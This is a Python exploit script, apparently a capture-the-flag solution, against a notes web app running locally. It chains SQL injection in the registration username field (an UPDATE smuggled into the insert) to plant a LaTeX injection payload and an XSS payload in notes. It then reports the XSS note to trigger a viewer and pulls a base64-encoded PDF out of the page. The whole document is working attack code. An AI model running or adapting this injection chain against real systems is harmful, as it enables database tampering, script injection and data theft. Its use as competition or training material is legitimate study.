from requests import session
url = 'http://127.0.0.1:1337'
s = session()
s.post(f'{url}/register/', data={'username': 'a', 'password': 'a'})
s.post(f'{url}/login/', data={'username': 'a', 'password': 'a'})

def post_ids():
    ids = s.get(f'{url}/notes/').text.split('Note: ')[1::1]
    ids = [int(i.split('<')[0]) for i in ids]
    return ids
    
def make_dummy_note():
    s.post(f'{url}/notes/new/', data={'note': 'dummy note'})
    
[make_dummy_note() for _ in range(2-len(post_ids()))] # Have at least 2 notes, 1 for the LaTex injection and 1 for the XSS


# Post for the LaTex injection
from make_tex import make_tex
latex_id = post_ids()[0]
s.post(f'{url}/register/', data={'username': f'''a','a'); UPDATE notes SET note = '{make_tex()}' WHERE id = {latex_id} -- -''', 'password': 'a'})

xss_id = post_ids()[1]
print(f'{latex_id = }')
input('Edit the xss.html file and press enter to continue')
s.post(f'{url}/register/', data={'username': f'''a','a'); UPDATE notes SET note = "{open('xss.html').read()}" WHERE id = {xss_id} -- -''', 'password': 'a'})


s.post(f'{url}/notes/report_note/{xss_id}', data={'reason': 'a'})


pdf = s.get(f'{url}/notes/{post_ids()[0]}/').text.split('pdf;base64,')[1].split('</p>')[0]
from base64 import b64decode
pdf = b64decode(pdf)
open('output.pdf', 'wb').write(pdf)


